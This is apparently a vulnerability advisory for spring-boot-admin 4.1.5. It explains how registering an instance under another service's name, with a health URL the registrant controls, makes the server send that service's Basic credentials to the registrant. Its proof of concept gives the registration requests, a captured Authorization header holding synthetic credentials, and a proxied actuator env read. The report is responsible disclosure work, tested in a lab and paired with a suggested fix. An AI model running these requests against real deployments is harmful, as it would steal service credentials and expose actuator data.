# SPRING-BOOT-ADMIN-2026-02: Name-keyed instance-auth credentials are sent to a registrant-chosen URL

- Product: codecentric/spring-boot-admin (https://github.com/codecentric/spring-boot-admin)
- Reporter: thientc (VinSOC)
- Vendor status: reported 2026-11-04 through GitHub private vulnerability reporting, [GHSA-m655-hhxw-w3mh](https://github.com/codecentric/spring-boot-admin/security/advisories/GHSA-m655-hhxw-w3mh) (filed against 4.1.4; still present in 4.1.5); in triage, no maintainer reply as of 2026-11-23; follow-up comment posted 2026-11-23
- CVE: requested from MITRE on 2026-11-23, pending
- Version: 4.1.5

## Summary

With `spring.boot.admin.instance-auth` enabled, SBA picks the Basic credential for an outbound instance request by the registered `name`, then adds it to every request to that instance's URLs. Anyone who can call `POST /instances` can register under another service's name with a `healthUrl` they control, and SBA's own health poll sends that service's credential to them. In my lab the collector received the synthetic `orders` service-map user and password.

## Details

`POST /instances` binds a registrant-supplied `Registration` (`name`, `healthUrl`, `managementUrl`, `serviceUrl`) (`spring-boot-admin-server/src/main/java/de/codecentric/boot/admin/server/web/InstancesController.java:82-83`). `Registration` checks only `hasText(name)` and URL syntax (`.../domain/values/Registration.java:74-76`); the name is not tied to the URL or to the registrant.

The automatic health poll calls the registered `healthUrl` through the instance WebClient (`.../services/StatusUpdater.java:93-95`). `InstanceExchangeFilterFunctions.java:69` adds the provider headers to every outbound instance request, whatever the target host. `BasicAuthHttpHeaderProvider` picks the credential with `serviceMap.get(registeredName)` (line 87), falls back to the default credentials (line 93), and sets `Authorization: Basic ...` (line 100).

The documentation describes name keys (`spring-boot-admin-docs/src/site/docs/02-server/02-security.md:166-186`) but nothing that binds a service's credential to that service's URL. Metadata credentials (`user.name`, `user.password`) only replace the registrant's own and do not stop the lookup when absent.

## PoC

Lab: SBA 4.1.5, Spring Security with a USER account that may register, `instance-auth.enabled=true` with a `service-map` entry `orders` mapped to the synthetic user `orders-svc-user` / `ORDERS-SYNTH-PW-91c2`, SSRF protection on with the mock's range allowed, and a mock HTTP collector that logs request headers.

Control, a name with no entry:

```
POST /instances   (Basic <lab user>)
{"name":"unconfigured-<M>","healthUrl":"http://<mock>:8080/health/<M>/1", ...}
-> 201; mock saw GET /health/<M>/1 with no Authorization header
```

Attack, the configured name with the same kind of URL:

```
POST /instances   (Basic <lab user>)
{"name":"orders","healthUrl":"http://<mock>:8080/health/<M>/2", ...}
-> 201; mock saw GET /health/<M>/2 with
   Authorization: Basic b3JkZXJzLXN2Yy11c2VyOk9SREVSUy1TWU5USC1QVy05MWMy   (orders-svc-user:ORDERS-SYNTH-PW-91c2)
```

Both attack registrations received the credential and both controls got no Authorization header. Each instance was deleted afterwards (204, then 404). Rebuilding the lab with Spring Boot 4.1.2 and running two more sweeps gave the same result.

The same lookup runs on proxied requests (`InstancesProxyController.java:86-116`, `InstanceWebProxy.java:118`, `InstanceExchangeFilterFunctions.java:66-69`), so the registrant can instead point `managementUrl` at the named service's real actuator. A mock `orders` actuator returned its synthetic `env` only for the `orders` credential:

```
POST /instances   {"name":"orders","managementUrl":"http://<mock>:8080/actuator", ...}   -> 201
GET /instances/<id>/actuator/env                                                         -> 200, synthetic orders.db.secret
```

The same request under an unconfigured name returned 401. I ran this twice with two controls. Only GET `env` was tried; state-changing actuator calls through the proxy were not.

## Impact

A principal that can register an instance can obtain the actuator Basic credential the operator configured for any other named service, or the default credential, by registering under that name with a URL it controls. Clients usually register with one shared client principal, so any monitored app or holder of that credential can claim another service's name.

The proxied read adds less than it looks like. Any authenticated SBA user may already call `/instances/{id}/actuator/**` for every instance in the lab chain (no per-instance check in `InstancesProxyController.java:86-132`), so reading a properly registered `orders` instance would also attach its credential. The chain adds access only when the named service is not itself registered with SBA. The score below covers the credential disclosure only.

Suggested fix: bind each `service-map` entry to the hosts or CIDRs it may be sent to and add the header only when the target matches, make default credentials opt-in per host, or refuse the lookup for a name that collides with a configured entry unless the registrant is authorised for it. I did not test this change.

## Affected versions

- Tested and affected: 4.1.5 (tag `4.1.5`, commit `c3034e1038afda381282fc7a9170a933a71a3e67`).
- `BasicAuthHttpHeaderProvider.java` is byte-identical in 4.1.4, where I also reproduced it.
- Fixed in: no fixed release known.

Tested on a local Spring Boot lab with synthetic accounts and data only; no live deployment was tested. Version tested: 4.1.5.

## Severity

CVSS 3.1 base score **5.3** (Medium): `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N`

- **AV:N** `POST /instances` is a network HTTP API and SBA then calls the registrant's URL.
- **AC:H** It needs operator-enabled instance-auth with a service-map or default credentials, knowledge of the victim service name, and a destination the SSRF filter admits (opt-in; allowed range in my lab).
- **PR:L** Registration needed an authenticated user in the lab. An unsecured SBA (PR:N) was not run.
- **UI:N** SBA sends the header on its own status polls.
- **S:U** It discloses credentials SBA already holds. The proxied read is not scored as a scope change for the reason in Impact.
- **C:H** The full user name and password for the mapped service.
- **I:N** None demonstrated.
- **A:N** None demonstrated.

## Credit

thientc (VinSOC)
